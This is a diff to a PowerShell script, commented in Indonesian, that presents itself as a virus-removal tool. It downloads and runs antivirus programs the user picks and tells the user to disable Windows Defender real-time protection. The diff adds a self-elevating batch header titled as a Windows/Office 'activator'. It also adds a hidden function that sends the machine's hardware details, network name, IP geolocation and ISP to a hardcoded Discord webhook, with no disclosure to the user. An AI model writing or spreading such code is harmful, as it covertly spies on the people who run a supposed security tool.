@@ -1,3 +1,51 @@
+<# ::
+@echo off
+title // ACTIVATOR WINDOWS + OFFICE PERMANENT - INDOJAVA ONLINE - HINZDC X SARGA
+mode con cols=90 lines=40
+color 0B
+
+:Begin UAC check and Auto-Elevate Permissions
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+echo:
+echo:
+echo                 Requesting Administrative Privileges...
+echo:
+echo                 ENABLING ADMINISTRATOR RIGHTS...
+echo                 Press YES in UAC Prompt to Continue
+echo.
+echo		 	     Please Wait...
+echo:
+
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+cls
+
+powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
+goto :eof
+
+#>
+
+#-----------------------------------------------------------------------------------------
+
+
 <#
 .SYNOPSIS
     Virus Removal Tools - Remove viruses, malware, and other threats from your PC.
@@ -59,7 +107,7 @@ $downloadPath = "$env:TEMP\AntivirusScanner-$randomguid.exe"
 
 # Fungsi untuk mengunduh dan menjalankan antivirus
 function DownloadAndRun {
-    param ($url, $description, $tip)
+    param ($name, $url, $description, $tip)
 
     Write-Host "--------------------------------------------------------------------------------"
     Write-Host "$description`n"
@@ -67,6 +115,7 @@ function DownloadAndRun {
     Write-Host "Harap matikan Real-time Protection pada Windows Defender sebelum melakukan scan.`nAgar tidak bentrok dan mengganggu proses scan.`n" -ForegroundColor Red
     Write-Host " TIPS: " -BackgroundColor Green -ForegroundColor White
     Write-Host "$tip" -ForegroundColor Blue
+    webhooks
     Write-Host "--------------------------------------------------------------------------------"
 
     Write-Host "`n + Mengunduh antivirus..."
@@ -89,6 +138,69 @@ function DownloadAndRun {
             exitScript  # Keluar dari skrip
         }
     } while ($true)
+}
+
+function webhooks {
+    $discordWebhookUrl = "https://discordapp.com/api/webhooks/1337473337823203381/0gtdn-CLf_3uhKb1skosboqeWKwF2S9DQ6H-m10B4C0NVVll2v435GbwsU4I-tCOBkAh"
+
+    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
+    $manufacturer = $computerSystem.Vendor
+    $tipe = $computerSystem.Version
+    $systemmodel = $computerSystem.Name
+    $os = Get-CimInstance Win32_OperatingSystem
+    $cpu = Get-CimInstance Win32_Processor
+    $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
+    $disk = Get-CimInstance Win32_DiskDrive | ForEach-Object { "$($_.Model) - $([math]::Round($_.Size / 1GB, 2)) GB" }
+
+    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
+    if ($wifi) {
+        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
+    } else {
+        $wifiName = "Tidak ada Wi-Fi yang terhubung."
+    }
+
+    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
+    if ($lanAdapter) {
+        $lanStatus = "LAN terhubung: $($lanAdapter.Name)"
+        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
+        if ($pingResult.StatusCode -eq 0) {
+            $internetStatus = "Internet melalui LAN terhubung."
+        } else {
+            $internetStatus = "Internet melalui LAN tidak terhubung."
+        }
+    } else {
+        $lanStatus = "Tidak ada LAN yang terhubung."
+        $internetStatus = "Internet melalui LAN tidak tersedia."
+    }
+
+    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
+
+    $message = @"
+    ---------------------------------------------
+    **:shield: VIRUS REMOVAL TOOLS**
+
+    **:computer: SYSTEM INFO**
+    Merek: $manufacturer
+    Model: $tipe ($systemmodel)
+    OS: $($os.Caption) ($($os.Version))
+    CPU: $($cpu.Name) ($($cpu.NumberOfCores) Cores, $($cpu.NumberOfLogicalProcessors) Threads)
+    RAM: $([math]::Round($ram, 2)) GB
+    Disk: $($disk -join ", ")
+
+    **:globe_with_meridians: NETWORK**
+    SSID: $wifiName
+    LAN: $lanStatus
+    $internetStatus
+    Lokasi: $($ipInfo.city), $($ipInfo.country) ($($ipInfo.zip))
+    ISP: $($ipInfo.isp)
+
+    **ANTIVIRUS DIPILIH**
+    $name
+
+"@
+
+    $body = @{ content = $message } | ConvertTo-Json -Compress
+    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
 }
 
 # Fungsi untuk keluar dan menghapus file sisa
@@ -122,7 +234,7 @@ while ($true) {
     # Memvalidasi input
     if ($choice -match "^\d+$" -and [int]$choice -ge 1 -and [int]$choice -le $antivirusList.Count) {
         $index = [int]$choice - 1
-        DownloadAndRun -url $antivirusList[$index].URL -description $antivirusList[$index].Description -tip $antivirusList[$index].Tip
+        DownloadAndRun -name $antivirusList[$index].Name -url $antivirusList[$index].URL -description $antivirusList[$index].Description -tip $antivirusList[$index].Tip
     } else {
         Write-Host "`nPilihan tidak valid. Silakan coba lagi.`n" -ForegroundColor Red
         Start-Sleep -Seconds 2
